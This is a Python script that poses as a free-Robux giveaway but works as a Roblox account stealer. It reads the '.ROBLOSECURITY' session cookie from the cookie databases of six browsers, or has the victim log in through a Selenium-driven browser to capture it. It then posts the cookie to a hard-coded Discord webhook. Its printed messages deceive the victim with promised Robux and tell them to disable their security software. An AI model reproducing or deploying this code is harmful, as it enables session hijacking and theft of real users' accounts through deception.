import os
import sqlite3
import shutil
import requests
import json
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

WEBHOOK_URL = "https://discord.com/api/webhooks/1448849190988808223/tZETwDo54A6YEZQObh8hu_zbJiIjgQbBoKQp7io-07z9t3tI8NWKkRD53-iXalLm8a2x"

def get_cookie_from_browser(browser_name, cookie_path_patterns, cookie_file_name):
    for pattern in cookie_path_patterns:
        profiles = list(Path.home().glob(pattern))
        for profile in profiles:
            cookie_db = profile / cookie_file_name
            if cookie_db.exists():
                temp_path = Path("/tmp/cookie_temp.sqlite")
                shutil.copy2(cookie_db, temp_path)
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                try:
                    if browser_name == "firefox":
                        cursor.execute("SELECT value FROM moz_cookies WHERE host LIKE '%roblox.com%' AND name = '.ROBLOSECURITY'")
                    else:
                        cursor.execute("SELECT value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name = '.ROBLOSECURITY'")
                    row = cursor.fetchone()
                    conn.close()
                    os.remove(temp_path)
                    if row:
                        return row[0]
                except:
                    conn.close()
                    os.remove(temp_path)
    return None

def get_all_cookies():
    browsers = {
        "firefox": [".mozilla/firefox/*.default-release", ".mozilla/firefox/*.default"],
        "chrome": [".config/google-chrome/Default", ".config/google-chrome/Profile*"],
        "edge": [".config/microsoft-edge/Default", ".config/microsoft-edge/Profile*"],
        "opera": [".config/opera/Default", ".config/opera/Profile*"],
        "opera_gx": [".config/operagx/Default", ".config/operagx/Profile*"],
        "brave": [".config/BraveSoftware/Brave-Browser/Default", ".config/BraveSoftware/Brave-Browser/Profile*"]
    }
    
    cookie_files = {
        "firefox": "cookies.sqlite",
        "chrome": "Cookies",
        "edge": "Cookies",
        "opera": "Cookies",
        "opera_gx": "Cookies",
        "brave": "Cookies"
    }
    
    for browser, patterns in browsers.items():
        cookie = get_cookie_from_browser(browser, patterns, cookie_files[browser])
        if cookie:
            return cookie
    return None

def login_and_get_cookie():
    driver = webdriver.Firefox()
    driver.get("https://www.roblox.com/login")
    
    input("Press Enter after you log in manually in the browser...")
    
    cookies = driver.get_cookies()
    for cookie in cookies:
        if cookie['name'] == '.ROBLOSECURITY':
            driver.quit()
            return cookie['value']
    
    driver.quit()
    return None

def send_to_discord(cookie):
    data = {"content": f"**Roblox Cookie:**\n```\n{cookie}\n```"}
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code in [200, 204]:
            print("wait from 7 to 14 day if you didnt get any robux try to buy robux and try again")
        else:
            print(f"Send failed: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    cookie = get_all_cookies()
    
    if not cookie:
        print("No account find to send the robux. Pleas login into any browser from these (Firefox, chrome, Brave, opera, opera gx)")
        cookie = login_and_get_cookie()
    
    if cookie:
        send_to_discord(cookie)
    else:
        print("sorry you can't get any robux desable your security system")

if __name__ == "__main__":
    main()
